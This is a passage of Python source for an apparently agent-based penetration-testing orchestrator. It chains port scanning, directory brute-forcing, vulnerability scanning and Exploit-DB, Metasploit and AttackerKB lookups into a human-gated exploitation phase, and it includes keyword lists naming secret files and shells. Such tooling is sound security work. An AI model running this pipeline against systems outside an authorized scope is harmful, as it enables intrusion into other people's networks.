            thought="Dispatching recon agents in parallel.",
            reasoning="Passive OSINT and Active Recon can run simultaneously "
                      "to maximize coverage while minimizing elapsed time.",
            action="dispatch_agents",
        )

        # NOTE: Do NOT pre-seed discovered_urls from scope targets here.
        # Parallel agents (JS, PO) would consume unvalidated URLs before
        # AR's port filter runs — causing scans against closed ports.
        # Instead, AR populates discovered_urls from Httpx after Naabu
        # confirms open ports, and downstream agents build URLs from
        # ctx.discovered_hosts as needed.

        # Run PO, AR, and JS in parallel
        po_task = asyncio.create_task(self._recon_passive(ctx))
        ar_task = asyncio.create_task(self._recon_active(ctx))
        js_task = asyncio.create_task(self._recon_js_analysis(ctx))
        await asyncio.gather(po_task, ar_task, js_task, return_exceptions=True)

    async def _recon_passive(self, ctx: EngagementContext):
        """PO: Passive OSINT — GAU, WhatWeb, Subfinder."""
        po = self._runner("PO", ctx)

        targets = ctx.scope.get("targets", [])

        # Parse targets: extract hostnames for GAU, domains for subfinder
        gau_targets = []  # GAU works with domains AND URLs
        subfinder_targets = []  # Subfinder only works with domains (not IPs)

        for t in targets:
            if t.startswith("*."):
                # Wildcard domain
                domain = t.lstrip("*.")
                gau_targets.append(domain)
                subfinder_targets.append(domain)
            elif "://" in t:
                # Full URL — extract hostname for GAU
                parsed = urlparse(t)
                host = parsed.hostname
                if host:
                    gau_targets.append(host)
                    # Only add to subfinder if it's a domain (not IP)
                    if not host.replace(".", "").isdigit():
                        subfinder_targets.append(host)
            elif not t[0].isdigit():
                # Bare domain
                gau_targets.append(t)
                subfinder_targets.append(t)
            else:
                # Bare IP — GAU can try, subfinder can't
                gau_targets.append(t)

        # Deduplicate
        gau_targets = list(dict.fromkeys(gau_targets))
        subfinder_targets = list(dict.fromkeys(subfinder_targets))

        if not gau_targets:
            await po.complete("No targets for passive OSINT — skipping.")
            return

        for target in gau_targets[:5]:  # Cap at 5
            # GAU URL discovery
            await po.think(
                thought=f"Running GAU against {target} for historical URL discovery.",
                reasoning="GAU pulls from Wayback Machine, Common Crawl, and AlienVault OTX "
                          "without touching the target directly.",
            )
            result = await po.run_tool(
                "gau_discover",
                {"target": target},
                display=f"Running GAU against {target}...",
            )
            if result.success:
                urls = parse_gau_output(result.stdout)
                ctx.discovered_urls.extend(urls)

        # Subfinder only for domain targets (not IPs)
        for domain in subfinder_targets[:5]:
            await po.think(
                thought=f"Running Subfinder against {domain}.",
                reasoning="Subdomain enumeration reveals additional attack surface.",
            )
            result = await po.run_tool(
                "subfinder_enum",
                {"target": domain},
                display=f"Running Subfinder against {domain}...",
            )
            if result.success:
                subs = parse_subfinder_output(result.stdout)
                ctx.discovered_subdomains.extend(subs)

        await po.complete(
            f"Passive OSINT complete: {len(ctx.discovered_urls)} URLs, "
            f"{len(ctx.discovered_subdomains)} subdomains."
        )

    async def _recon_active(self, ctx: EngagementContext):
        """AR: Active Recon — Naabu → Httpx → Nmap (deep) → Gobuster."""
        ar = self._runner("AR", ctx)
        targets = ctx.scope.get("targets", [])
        hosts = extract_hosts(targets)
        target_str = " ".join(hosts)

        # Step 1: Fast port discovery — Naabu with Nmap fallback
        await ar.think(
            thought="Starting fast port discovery with Naabu.",
            reasoning="Naabu SYN scan is 10-100x faster than Nmap for initial port discovery. "
                      "Results feed into Httpx and deep Nmap scans. Falls back to Nmap if Naabu unavailable.",
            action="run_naabu",
        )
        naabu_result = await ar.run_tool(
            "naabu_scan",
            {"target": target_str, "additional_args": "-p -"},
            display=f"Running Naabu full port scan (1-65535) on {target_str}...",
        )

        records = []
        if naabu_result.success:
            records = parse_naabu_results(naabu_result.stdout, ctx.engagement_id)

        # Fallback to Nmap if Naabu failed OR returned 0 results
        if not records:
            fallback_reason = (
                f"Naabu error: {naabu_result.error or 'unknown'}"
                if not naabu_result.success
                else "Naabu found 0 open ports — target may be unreachable or filtered"
            )
            await ar.think(
                thought=f"Falling back to Nmap for port discovery. {fallback_reason}",
                reasoning="Nmap with -Pn (skip host discovery) and CONNECT scan will "
                          "attempt to reach the target even if ICMP is filtered. "
                          "This is more reliable than Naabu for hardened targets.",
                action="run_nmap_fallback",
            )
            nmap_fallback = await ar.run_tool(
                "nmap_scan",
                {"target": target_str, "scan_type": "-Pn -sT --min-rate=1000",
                 "ports": "", "additional_args": "--open"},
                display=f"Nmap port discovery on {target_str} (fallback)...",
            )
            if nmap_fallback.success:
                parsed = parse_nmap_output(nmap_fallback.stdout)
                for host in parsed["hosts"]:
                    for p in host.get("ports", []):
                        if p.get("state") == "open":
                            records.append({
                                "ip": host["ip"],
                                "port": p["port"],
                                "protocol": p.get("protocol", "tcp"),
                            })

        if records:
            ctx.discovered_hosts.extend(records)
            ctx.host_count = len(set(r["ip"] for r in records))
            ctx.service_count = len(records)
            await ar._emit_stats()

            # Write hosts to Neo4j
            host_map = {}
            for r in records:
                ip = r["ip"]
                if ip not in host_map:
                    host_map[ip] = {"ip": ip, "hostname": "", "ports": []}
                host_map[ip]["ports"].append({
                    "port": r["port"], "protocol": r["protocol"],
                    "service": "", "version": "",
                })
            await ar.write_hosts_neo4j(list(host_map.values()))

        # Step 2: Httpx web probing on discovered hosts
        alive_hosts = list(set(r["ip"] for r in ctx.discovered_hosts))
        if alive_hosts:
            await ar.think(
                thought="Running Httpx to identify web services on discovered ports.",
                reasoning="Httpx probes HTTP/HTTPS with tech detection, status codes, and titles. "
                          "Reveals web application stack for vulnerability analysis.",
            )
            # Build target list with common web ports
            httpx_targets = []
            web_ports = {80, 443, 8080, 8443, 8000, 8180, 8888, 3000, 3030, 5000, 9090}
            https_ports = {443, 8443}
            for r in ctx.discovered_hosts:
                if r["port"] in web_ports:
                    proto = "https" if r["port"] in https_ports else "http"
                    httpx_targets.append(f"{proto}://{r['ip']}:{r['port']}")

            if httpx_targets:
                httpx_result = await ar.run_tool(
                    "httpx_probe",
                    {"targets": httpx_targets[:200]},  # Cap at 200
                    display=f"Running Httpx on {len(httpx_targets)} web targets...",
                )
                if httpx_result.success:
                    urls = parse_httpx_results(httpx_result.stdout, ctx.engagement_id)
                    ctx.discovered_urls.extend([u["url"] for u in urls])
                    ctx.service_count = len(set(
                        (r["ip"], r["port"]) for r in ctx.discovered_hosts
                    ))
                    await ar._emit_stats()

        # Step 3: Nmap deep scan on interesting hosts
        if alive_hosts[:20]:  # Deep scan top 20 hosts
            await ar.think(
                thought="Running Nmap service version detection on top targets.",
                reasoning="Deep Nmap scan (-sV -sC) provides service versions and script output "
                          "for accurate CVE matching in the threat modeling phase.",
            )
            for host_ip in alive_hosts[:20]:
                nmap_result = await ar.run_tool(
                    "nmap_scan",
                    {"target": host_ip, "scan_type": "-sV -sC", "ports": ""},
                    display=f"Nmap deep scan on {host_ip}...",
                )
                if nmap_result.success:
                    parsed = parse_nmap_output(nmap_result.stdout)
                    for host in parsed["hosts"]:
                        # Update existing host records with version info
                        await ar.write_hosts_neo4j([host])

        # Step 4: Gobuster on web targets
        # Filter out URLs whose ports aren't actually open (pre-seeded scope URLs may have closed ports)
        open_ports: set[tuple[str, int]] = {(r["ip"], r["port"]) for r in ctx.discovered_hosts}
        # Default ports: 80 for http, 443 for https
        def _url_port_open(url: str) -> bool:
            try:
                p = urlparse(url)
                host = p.hostname or ""
                port = p.port or (443 if p.scheme == "https" else 80)
                return (host, port) in open_ports
            except Exception:
                return False
        ctx.discovered_urls = [u for u in ctx.discovered_urls if _url_port_open(u)]
        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")][:10]
        if web_targets:
            await ar.think(
                thought="Running Gobuster directory scanning on web targets.",
                reasoning="Directory brute-forcing reveals hidden admin panels, "
                          "backup files, and API endpoints.",
            )
            for target_url in web_targets[:5]:  # Cap at 5
                gobuster_result = await ar.run_tool(
                    "gobuster_scan",
                    {"url": target_url},
                    display=f"Gobuster dir scan on {target_url}...",
                )
                if gobuster_result.success:
                    paths = parse_gobuster_output(gobuster_result.stdout)
                    # Sensitive directory patterns that warrant findings
                    _sensitive_dirs = {
                        "admin", "administrator", "phpmyadmin", "wp-admin",
                        "backup", "backups", "bak", "old", "temp", "tmp",
                        "config", "conf", "include", "includes", "private",
                        "secret", "hidden", "debug", "test", "dev",
                        ".git", ".svn", ".env", ".htaccess", ".htpasswd",
                        "upload", "uploads", "cgi-bin", "server-status",
                        "phpinfo", "info", "shell", "console", "db",
                        "database", "sql", "dump", "log", "logs",
                    }
                    for p in paths:
                        full_url = f"{target_url.rstrip('/')}{p['path']}"
                        ctx.discovered_urls.append(full_url)
                        # Check if this is a sensitive directory
                        path_lower = p["path"].strip("/").lower()
                        if path_lower in _sensitive_dirs or any(
                            s in path_lower for s in (
                                ".git", ".env", ".htaccess", "phpmyadmin",
                                "phpinfo", "backup", "server-status",
                            )
                        ):
                            sev = "high" if path_lower in (
                                ".git", ".env", ".htpasswd", "phpmyadmin",
                                "server-status", "phpinfo", "backup",
                                "database", "sql", "dump",
                            ) else "medium"
                            await ar.report_finding(
                                title=f"Sensitive directory discovered: {p['path']}",
                                severity=sev,
                                category="Information Disclosure",
                                target=full_url,
                                description=(
                                    f"Directory brute-forcing revealed {p['path']} "
                                    f"(HTTP {p.get('status', '?')}). This may expose "
                                    f"sensitive files, configuration, or admin interfaces."
                                ),
                            )

        await ar.complete(
            f"Active recon complete: {ctx.host_count} hosts, "
            f"{ctx.service_count} services, "
            f"{len(ctx.discovered_urls)} URLs."
        )

    # ── Phase 3: Threat Modeling ──

    async def _phase_threat_modeling(self, ctx: EngagementContext):
        """CV: CVE lookup + AP: Attack path analysis."""
        await self._emit_phase("THREAT MODELING")

        cv = self._runner("CV", ctx)
        await cv.think(
            thought="Cross-referencing detected technologies with vulnerability databases.",
            reasoning="Service versions from Nmap and tech stacks from Httpx need to be "
                      "checked against NVD, Exploit-DB, and CISA KEV for known exploits.",
            action="query_cves",
        )

        # Nuclei CVE templates on network targets ONLY (bare IPs/ports).
        # Web URLs (http/https) are handled by WV agent in _vuln_web_scan()
        # to avoid duplicate Nuclei runs on the same targets.
        ip_targets = list(set(r["ip"] for r in ctx.discovered_hosts))

        if ip_targets:
            nuclei_result = await cv.run_tool(
                "nuclei_scan",
                {"targets": ip_targets[:100], "severity": "critical,high",
                 "additional_args": "-tags cve -tags network"},
                display=f"Running Nuclei CVE templates against {len(ip_targets)} network targets...",
            )
            if nuclei_result.success:
                vulns = parse_nuclei_results(nuclei_result.stdout, ctx.engagement_id)
                ctx.discovered_vulns.extend(vulns)
                ctx.vuln_count += len(vulns)
                await cv.write_vulns_neo4j(vulns)
                ctx.cves = list(set(
                    v["cve_id"] for v in vulns if v.get("cve_id")
                ))
                await cv._emit_stats()

        # SearchSploit version-based CVE lookup from Nmap service versions in Neo4j
        version_queries: list[str] = []
        from server import neo4j_available, neo4j_driver as _neo4j_driver
        if neo4j_available and _neo4j_driver:
            try:
                with _neo4j_driver.session() as session:
                    result = session.run("""
                        MATCH (s:Service {engagement_id: $eid})
                        WHERE s.version IS NOT NULL AND s.version <> ''
                        RETURN DISTINCT s.service AS service, s.version AS version
                    """, eid=ctx.engagement_id)
                    for record in result:
                        svc = record["service"] or ""
                        ver = record["version"] or ""
                        if ver:
                            # Build query like "Apache 2.4.58" or "OpenSSH 8.9"
                            query = f"{svc} {ver}".strip() if svc else ver
                            if query and query not in version_queries:
                                version_queries.append(query)
            except Exception as e:
                logger.warning("Neo4j version query for SearchSploit: %s", e)

        if version_queries:
            await cv.think(
                thought=f"Searching ExploitDB for {len(version_queries)} service versions.",
                reasoning="Nmap identified specific software versions. SearchSploit checks "
                          "these against Exploit-DB for known public exploits and CVEs.",
                action="searchsploit_lookup",
            )
            for query in version_queries[:10]:
                ssploit_result = await cv.run_tool(
                    "searchsploit_version",
                    {"query": query},
                    display=f"SearchSploit: {query}...",
                )
                if not ssploit_result.success:
                    continue
                try:
                    data = json.loads(ssploit_result.stdout)
                    exploits = data.get("RESULTS_EXPLOIT", [])
                    for exp in exploits[:5]:
                        title = exp.get("Title", "Unknown")
                        path = exp.get("Path", "")
                        cve_match = re.search(r"CVE-\d{4}-\d+", title)
                        cve_id = cve_match.group(0) if cve_match else ""
                        vuln = {
                            "name": title,
                            "severity": "HIGH",
                            "host": "",
                            "matched_at": query,
                            "template_id": path,
                            "cve_id": cve_id,
                            "cvss_score": 0,
                            "description": f"ExploitDB: {title}",
                        }
                        ctx.discovered_vulns.append(vuln)
                        ctx.vuln_count += 1
                        if cve_id:
                            ctx.cves.append(cve_id)
                    if exploits:
                        await cv.write_vulns_neo4j([{
                            "name": f"ExploitDB matches for {query}",
                            "severity": "HIGH",
                            "host": query,
                            "matched_at": query,
                            "template_id": "",
                            "cve_id": ",".join(
                                re.search(r"CVE-\d{4}-\d+", e.get("Title", "")).group(0)
                                for e in exploits[:5]
                                if re.search(r"CVE-\d{4}-\d+", e.get("Title", ""))
                            ),
                            "cvss_score": 0,
                            "description": "; ".join(e.get("Title", "") for e in exploits[:5]),
                        }])
                        await cv._emit_stats()
                except (json.JSONDecodeError, Exception) as e:
                    logger.warning("SearchSploit parse error for %s: %s", query, e)

        ctx.cves = list(set(ctx.cves))  # Deduplicate
        await cv.complete(
            f"CVE research complete: {len(ctx.discovered_vulns)} vulnerabilities, "
            f"{len(ctx.cves)} CVEs identified."
        )

        # AP: Attack Path Analyzer — queries Neo4j graph
        ap = self._runner("AP", ctx)
        await ap.think(
            thought="Constructing multi-step attack paths from CVE data and network topology.",
            reasoning="Identified CVEs across discovered hosts create potential kill chains. "
                      "Need to identify paths from external-facing services to high-value targets.",
            action="analyze_attack_paths",
        )
        # Query Neo4j for attack paths (if available)
        from server import neo4j_available, neo4j_driver
        attack_paths = []
        if neo4j_available and neo4j_driver:
            try:
                with neo4j_driver.session() as session:
                    result = session.run("""
                        MATCH (v:Vulnerability {engagement_id: $eid})
                        WHERE v.severity IN ['CRITICAL', 'HIGH']
                        RETURN v.name AS vuln, v.host AS host, v.severity AS severity
                        ORDER BY v.cvss_score DESC
                        LIMIT 20
                    """, eid=ctx.engagement_id)
                    for record in result:
                        attack_paths.append(dict(record))
            except Exception as e:
                logger.warning("Neo4j attack path query error: %s", e)

        await ap.complete(
            f"{len(attack_paths)} critical/high vulnerabilities mapped for attack paths."
        )

    # ── Phase 4: Vulnerability Analysis ──

    async def _phase_vuln_analysis(self, ctx: EngagementContext):
        """WV: Web vuln scanning → EC: Exploit enrichment (sequential).

        EC enriches vulns discovered by WV, so WV must complete first.
        """
        await self._emit_phase("VULNERABILITY ANALYSIS")

        # Sequential: WV discovers vulns, then EC enriches them
        await self._vuln_web_scan(ctx)
        await self._vuln_exploit_craft(ctx)

    async def _vuln_web_scan(self, ctx: EngagementContext):
        """WV: Nuclei web templates + Nikto + WPScan."""
        wv = self._runner("WV", ctx)
        targets = [u for u in ctx.discovered_urls if u.startswith("http")]

        if not targets:
            await wv.complete("No web targets for vulnerability scanning.")
            return

        # Nuclei with web-specific templates
        await wv.think(
            thought="Launching Nuclei with web vulnerability templates.",
            reasoning="Nuclei's template-based approach validates CVE findings and discovers "
                      "additional web vulnerabilities (XSS, SQLi, SSRF, etc.).",
            action="run_nuclei",
        )
        nuclei_result = await wv.run_tool(
            "nuclei_scan",
            {"targets": targets[:100], "severity": "critical,high,medium"},
            display=f"Running Nuclei web scan against {min(len(targets), 100)} targets...",
        )
        if nuclei_result.success:
            vulns = parse_nuclei_results(nuclei_result.stdout, ctx.engagement_id)
            for v in vulns:
                ctx.discovered_vulns.append(v)
                ctx.vuln_count += 1
                # Auto-report critical/high as findings
                if v["severity"] in ("CRITICAL", "HIGH"):
                    await wv.report_finding(
                        title=v["name"],
                        severity=v["severity"].lower(),
                        category="Web Vulnerability",
                        target=v.get("matched_at", v.get("host", "")),
                        description=v.get("description", f"Nuclei template: {v.get('template_id', '')}"),
                        cvss=v.get("cvss_score", 0),
                        cve=v.get("cve_id", ""),
                        evidence=f"Template: {v.get('template_id', '')}",
                    )
            await wv.write_vulns_neo4j(vulns)

        # Nikto on top web targets
        for target_url in targets[:5]:
            await wv.think(
                thought=f"Running Nikto web scanner on {target_url}.",
                reasoning="Nikto checks for dangerous files, outdated server software, "
                          "and version-specific problems.",
            )
            nikto_result = await wv.run_tool(
                "nikto_scan",
                {"target": target_url},
                display=f"Nikto scan on {target_url}...",
            )
            if nikto_result.success:
                nikto_findings = parse_nikto_output(nikto_result.stdout)

                # Deduplicate: group repetitive findings (e.g. dozens of
                # "backup/cert file found") into single summary findings
                unique_findings = []
                grouped: dict[str, list[str]] = {}  # pattern -> [paths]

                # Noisy patterns that Nikto repeats for every file variant
                _noisy_patterns = (
                    "potentially interesting backup",
                    "potentially interesting cert",
                    "potentially interesting archive",
                    "potentially interesting database",
                )

                for nf in nikto_findings:
                    finding_text = nf["finding"].lower()
                    matched_pattern = None
                    for pat in _noisy_patterns:
                        if pat in finding_text:
                            matched_pattern = pat
                            break
                    if matched_pattern:
                        # Extract path from finding (usually starts with /)
                        path = nf["finding"].split(":")[0].strip() if ":" in nf["finding"] else ""
                        grouped.setdefault(matched_pattern, []).append(path)
                    else:
                        unique_findings.append(nf)

                # Report grouped findings as single summary each
                for pat, paths in grouped.items():
                    sample = ", ".join(paths[:5])
                    extra = f" (and {len(paths) - 5} more)" if len(paths) > 5 else ""
                    await wv.report_finding(
                        title=f"Nikto: {len(paths)}x {pat.title()} files detected",
                        severity="low",
                        category="Web Server",
                        target=target_url,
                        description=(
                            f"Nikto detected {len(paths)} {pat} file paths.\n"
                            f"Samples: {sample}{extra}\n"
                            f"Note: Many may be soft-404 false positives if the "
                            f"server returns 200 for all paths."
                        ),
                    )

                # Report unique (non-noisy) findings, capped at 20 per target
                reported = 0
                for nf in unique_findings:
                    if reported >= 20:
                        await wv.report_finding(
                            title=f"Nikto: {len(unique_findings) - 20} additional findings omitted",
                            severity="info",
                            category="Web Server",
                            target=target_url,
                            description=f"Capped at 20 unique findings per target. "
                                        f"{len(unique_findings)} total unique findings detected.",
                        )
                        break

                    finding_text = nf["finding"].lower()
                    # Map Nikto findings to severity levels
                    if any(k in finding_text for k in (
                        "sql injection", "remote code", "command injection",
                        "file inclusion", "backdoor", "shell",
                    )):
                        sev = "critical"
                    elif any(k in finding_text for k in (
                        "directory index", "default password", "admin",
                        "phpinfo", "server-status", ".htaccess", ".git/",
                        "database", "config",
                    )):
                        sev = "high"
                    elif any(k in finding_text for k in (
                        "x-frame-options", "x-content-type",
                        "strict-transport", "allowed http method",
                        "etag", "server banner", "options method",
                        "cookie", "cors", "csp",
                    )):
                        sev = "medium"
                    else:
                        sev = "low"
                    await wv.report_finding(
                        title=nf["finding"][:100],
                        severity=sev,
                        category="Web Server",
                        target=target_url,
                        description=nf["finding"],
                    )
                    reported += 1

        # ── Version-based exploit lookup via SearchSploit ──
        # Grab server headers from each target to discover software versions,
        # then query SearchSploit for known exploits per version.
        await wv.think(
            thought="Checking web server versions against exploit databases.",
            reasoning="Server headers (Server, X-Powered-By) reveal software versions. "
                      "Cross-referencing with ExploitDB catches known vulns that "
                      "template scanners might miss.",
            action="version_exploit_lookup",
        )

        version_targets: dict[str, list[str]] = {}  # "nginx 1.26.0" -> [url1, ...]

        for target_url in targets[:5]:
            header_result = await wv.run_tool(
                "curl_raw",
                {"url": target_url, "options": "-sI -m 10"},
                display=f"Grabbing server headers from {target_url}...",
            )
            if not header_result.success:
                continue

            for hdr_line in header_result.stdout.split("\n"):
                hdr_line = hdr_line.strip()
                hdr_low = hdr_line.lower()

                # Server: nginx/1.26.0, Apache/2.4.58 (Debian)
                if hdr_low.startswith("server:"):
                    val = hdr_line.split(":", 1)[1].strip()
                    for token in val.split():
                        if "/" in token:
                            parts = token.split("/", 1)
                            name = parts[0].strip()
                            ver = parts[1].split("(")[0].strip().rstrip(",;")
                            if name and ver and ver[0].isdigit():
                                version_targets.setdefault(
                                    f"{name} {ver}", []
                                ).append(target_url)

                # X-Powered-By: PHP/8.1.2
                elif hdr_low.startswith("x-powered-by:"):
                    val = hdr_line.split(":", 1)[1].strip()
                    for token in val.split(","):
                        token = token.strip()
                        if "/" in token:
                            parts = token.split("/", 1)
                            name = parts[0].strip()
                            ver = parts[1].split("(")[0].strip().rstrip(",;")
                            if name and ver and ver[0].isdigit():
                                version_targets.setdefault(
                                    f"{name} {ver}", []
                                ).append(target_url)

        version_exploit_count = 0
        if version_targets:
            version_list = sorted(version_targets.keys())[:10]
            await wv.think(
                thought=f"Found {len(version_targets)} software versions: "
                        f"{', '.join(version_list[:5])}. "
                        f"Querying SearchSploit for known exploits.",
                reasoning="Version-specific exploit lookup catches vulnerabilities "
                          "that generic template scans miss.",
            )

            for query in version_list:
                ssploit_result = await wv.run_tool(
                    "searchsploit_version",
                    {"query": query},
                    display=f"SearchSploit lookup: {query}...",
                )
                if not ssploit_result.success or not ssploit_result.stdout.strip():
                    continue

                try:
                    data = json.loads(ssploit_result.stdout)
                    exploits = data.get("RESULTS_EXPLOIT", [])
                    for exp in exploits[:5]:  # Cap at 5 per version
                        title = exp.get("Title", "Unknown")
                        path = exp.get("Path", "")
                        edb_id = exp.get("EDB-ID", "")
                        affected_url = version_targets[query][0]
                        await wv.report_finding(
                            title=f"Known exploit: {query} — {title[:70]}",
                            severity="high",
                            category="Version Vulnerability",
                            target=affected_url,
                            description=(
                                f"SearchSploit found a known exploit for {query}.\n"
                                f"Title: {title}\n"
                                f"EDB-ID: {edb_id}\n"
                                f"Path: {path}\n"
                                f"Affected targets: {', '.join(version_targets[query][:3])}"
                            ),
                            evidence=f"searchsploit {query} -j",
                        )
                        version_exploit_count += 1
                except (json.JSONDecodeError, KeyError):
                    pass

        await wv.complete(
            f"Web vulnerability scanning complete: {ctx.vuln_count} total vulnerabilities"
            f"{f', {version_exploit_count} version-based exploits found' if version_exploit_count else ''}."
        )

    async def _vuln_exploit_craft(self, ctx: EngagementContext):
        """EC: Enrich vulnerabilities with exploit database intelligence.

        For each CRITICAL/HIGH vuln with a CVE, queries SearchSploit and
        Metasploit to discover available PoC code and modules. Enrichment
        data flows to EX for intelligent exploit selection.
        """
        ec = self._runner("EC", ctx)

        # Filter for enrichable vulns: CRITICAL/HIGH (with or without CVE IDs).
        # Vulns WITH CVE IDs get full enrichment (SearchSploit + Metasploit + AttackerKB).
        # Vulns WITHOUT CVE IDs but with service/version info get Metasploit search by name.
        enrichable = [
            v for v in ctx.discovered_vulns
            if v.get("severity") in ("CRITICAL", "HIGH")
        ]

        if not enrichable:
            await ec.think(
                thought="No CRITICAL/HIGH vulnerabilities to enrich.",
                reasoning="No critical or high severity vulnerabilities discovered yet. "
                          "Enrichment skipped — EX will use generic Nuclei re-validation.",
            )
            await ec.complete("No CRITICAL/HIGH vulns for enrichment — skipping.")
            return

        # Cap at 10 vulns to stay within time budget
        enrichable = enrichable[:10]

        await ec.think(
            thought=f"Enriching {len(enrichable)} vulnerabilities with exploit intelligence.",
            reasoning="Querying SearchSploit (ExploitDB) and Metasploit module database "
                      "for each CVE. Concurrent per-vuln, batched to limit load.",
            action="enrich_vulns",
        )

        # Process in batches of 3 concurrent enrichments
        batch_size = 3
        total_enriched = 0
        total_exploits = 0

        for i in range(0, len(enrichable), batch_size):
            batch = enrichable[i:i + batch_size]
            tasks = [self._enrich_single_vuln(ec, v) for v in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, result in enumerate(results):
                if isinstance(result, Exception):
                    logger.warning("Enrichment error for %s: %s",
                                   batch[j].get("cve_id", ""), result)
                elif result:
                    total_enriched += 1
                    total_exploits += result

        await ec.think(
            thought=f"Enrichment complete: {total_enriched}/{len(enrichable)} vulns enriched, "
                    f"{total_exploits} total exploits/modules found.",
            reasoning="Enrichment data attached to vuln dicts. EX agent will use "
                      "metasploit_best_module for priority exploitation.",
        )

        await ec.complete(
            f"Exploit enrichment complete: {total_enriched} vulns enriched, "
            f"{total_exploits} exploits/modules discovered across ExploitDB + Metasploit."
        )

    async def _enrich_single_vuln(self, ec: AgentRunner, vuln: dict) -> int:
        """Enrich a single vulnerability with SearchSploit + Metasploit + AttackerKB.

        Returns total exploit count found. Mutates vuln dict in-place with
        enrichment fields.

        Two modes:
        - WITH CVE ID: Full enrichment (SearchSploit + Metasploit + AttackerKB)
        - WITHOUT CVE ID: Keyword search (Metasploit by name/service, SearchSploit by matched_at)
        """
        cve_id = vuln.get("cve_id", "")

        if cve_id:
            # Full CVE-based enrichment
            cve_number = cve_id.replace("CVE-", "")
            ssploit_task = self._enrich_searchsploit(ec, cve_number)
            msf_task = self._enrich_msf(ec, cve_id)
            akb_task = self._enrich_attackerkb(ec, cve_id)
        else:
            # Keyword-based enrichment (no CVE ID available)
            # Use vuln name or matched_at as search keyword for Metasploit/SearchSploit
            keyword = vuln.get("matched_at", "") or vuln.get("name", "")
            if not keyword:
                return 0
            # Truncate long keywords to first meaningful part
            keyword = keyword.split(" - ")[0].strip()[:60]
            ssploit_task = self._enrich_searchsploit(ec, keyword)
            msf_task = self._enrich_msf_keyword(ec, keyword)

            async def _noop():
                return None
            akb_task = _noop()  # No AttackerKB without CVE ID

        results = await asyncio.gather(
            ssploit_task, msf_task, akb_task, return_exceptions=True,
        )

        ssploit_results = results[0] if not isinstance(results[0], Exception) else []
        msf_results = results[1] if not isinstance(results[1], Exception) else []
        akb_result = results[2] if not isinstance(results[2], Exception) else None

        errors = []
        if isinstance(results[0], Exception):
            errors.append(f"searchsploit: {results[0]}")
        if isinstance(results[1], Exception):
            errors.append(f"msf_search: {results[1]}")
        if isinstance(results[2], Exception):
            errors.append(f"attackerkb: {results[2]}")

        # Determine exploit sources
        sources = []
        if ssploit_results:
            sources.append("exploitdb")
        if msf_results:
            sources.append("metasploit")
        if akb_result:
            sources.append("attackerkb")

        # Find best Metasploit module (already sorted by rank in parser)
        best_module = None
        if msf_results:
            # Prefer exploit modules over auxiliary
            exploit_modules = [m for m in msf_results if m["module_type"] == "exploit"]
            best_module = exploit_modules[0] if exploit_modules else msf_results[0]

        # Enrich vuln dict in-place
        vuln["enriched"] = True
        vuln["exploit_count"] = len(ssploit_results) + len(msf_results)
        vuln["exploit_sources"] = sources
        vuln["exploitdb_results"] = ssploit_results
        vuln["metasploit_modules"] = [m["module_path"] for m in msf_results]
        vuln["metasploit_best_module"] = best_module
        vuln["attackerkb"] = akb_result  # None if unavailable
        if errors:
            vuln["enrichment_errors"] = errors

        return vuln["exploit_count"]

    async def _enrich_searchsploit(self, ec: AgentRunner, query: str) -> list[dict]:
        """Query SearchSploit for a CVE number or keyword and return parsed results."""
        # Detect if query looks like a CVE number (digits with dash)
        is_cve = bool(re.match(r"^\d{4}-\d+$", query))
        if is_cve:
            result = await ec.run_tool(
                "searchsploit_search",
                {"cve_id": query},
                display=f"SearchSploit CVE lookup: CVE-{query}...",
            )
        else:
            result = await ec.run_tool(
                "searchsploit_version",
                {"query": query},
                display=f"SearchSploit keyword: {query}...",
            )
        if result.success:
            return parse_searchsploit_json(result.stdout)
        return []

    async def _enrich_msf(self, ec: AgentRunner, cve_id: str) -> list[dict]:
        """Query Metasploit module database for a CVE and return parsed results."""
        result = await ec.run_tool(
            "msf_search",
            {"cve_id": cve_id},
            display=f"Metasploit module search: {cve_id}...",
        )
        if result.success:
            return parse_msf_search_output(result.stdout)
        return []

    async def _enrich_msf_keyword(self, ec: AgentRunner, keyword: str) -> list[dict]:
        """Query Metasploit module database by keyword (service/software name)."""
        result = await ec.run_tool(
            "msf_search_keyword",
            {"keyword": keyword},
            display=f"Metasploit keyword search: {keyword}...",
        )
        if result.success:
            return parse_msf_search_output(result.stdout)
        return []

    async def _enrich_attackerkb(self, ec: AgentRunner, cve_id: str) -> Optional[dict]:
        """Query AttackerKB for community intelligence on a CVE.

        Returns parsed topic dict with attacker_value, exploitability scores,
        or None if not found or API unavailable.
        """
        result = await ec.run_tool(
            "attackerkb_lookup",
            {"cve_id": cve_id},
            display=f"AttackerKB lookup: {cve_id}...",
        )
        if result.success:
            return parse_attackerkb_response(result.stdout)
        return None

    # ── Phase 5: Exploitation ──

    async def _phase_exploitation(self, ctx: EngagementContext):
        """EX: Exploitation (HITL gated) + VF: Verification.

        3-tier exploit selection:
          Priority 1: Metasploit module (from EC enrichment)
          Priority 2: SQLMap (for SQLi vulns)
          Priority 3: Nuclei re-validation (fallback)
        """
        await self._emit_phase("EXPLOITATION")

        ex = self._runner("EX", ctx)

        # Find exploitable vulns
        exploitable = [
            v for v in ctx.discovered_vulns
            if v.get("severity") in ("CRITICAL", "HIGH")
        ]

        if not exploitable:
            await ex.complete("No critical/high vulnerabilities to exploit.")
            return

        for vuln in exploitable[:5]:  # Cap at 5 exploits
            target = vuln.get("matched_at", vuln.get("host", ""))
            vuln_name = vuln.get("name", "Unknown")
            best_module = vuln.get("metasploit_best_module")
            exploit_count = vuln.get("exploit_count", 0)
            exploit_sources = vuln.get("exploit_sources", [])
            edb_results = vuln.get("exploitdb_results", [])

            # Build enrichment context for HITL description
            akb = vuln.get("attackerkb")
            enrichment_desc = ""
            if vuln.get("enriched"):
                parts = [f"{exploit_count} known exploit(s)"]
                if best_module:
                    parts.append(f"MSF: {best_module['module_path']} ({best_module['rank']})")
                if edb_results:
                    parts.append(f"ExploitDB: {len(edb_results)} PoC(s)")
                if akb:
                    av = akb.get("attacker_value", 0)
                    ex_score = akb.get("exploitability", 0)
                    parts.append(f"AKB: AV={av}/5 EX={ex_score}/5")
                enrichment_desc = " | ".join(parts)

            # Determine exploitation strategy
            if best_module and best_module.get("module_type") == "exploit":
                strategy = "metasploit"
                strategy_desc = f"Metasploit module: {best_module['module_path']} (rank: {best_module['rank']})"
            elif "sqli" in vuln_name.lower() or "sql" in vuln_name.lower():
                strategy = "sqlmap"
                strategy_desc = "SQLMap injection validation"
            else:
                strategy = "nuclei"
